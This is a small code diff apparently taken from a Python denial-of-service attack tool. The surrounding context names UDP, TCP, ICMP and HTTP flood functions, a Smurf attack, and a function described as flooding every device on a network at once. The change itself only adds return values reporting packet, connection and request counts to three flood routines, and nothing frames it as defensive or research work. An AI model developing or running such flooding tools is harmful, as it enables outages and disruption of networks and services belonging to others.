@@ -82,6 +82,7 @@ def udp_flood(target_ip, target_port, duration, threads_count):
         thread.join(timeout=2)
     
     print(f"\n[+] UDP flood completed - Total packets: {total_packets[0]:,}")
+    return total_packets[0]
 
 def network_wide_udp_flood(target_network, target_port, duration, threads_count):
     """Floods EVERY device on the network simultaneously"""
@@ -303,6 +304,7 @@ def tcp_flood(target_ip, target_port, duration, threads_count):
         thread.join(timeout=1)
     
     print(f"\n[+] TCP flood completed - Total connection attempts: {total_connections[0]:,}")
+    return total_connections[0]
 
 def icmp_flood(target_ip, duration, threads_count):
     print(f"[*] Starting ICMP flood on {target_ip} for {duration} seconds with {threads_count} threads")
@@ -443,6 +445,7 @@ def http_flood(target_ip, duration, threads_count):
         thread.join(timeout=2)
     
     print(f"\n[+] HTTP flood completed - Total requests: {total_requests[0]:,}")
+    return total_requests[0]
 
 def smurf_attack(target_ip, duration, threads_count):
     print(f"[*] Starting Smurf attack on {target_ip} for {duration} seconds with {threads_count} threads")
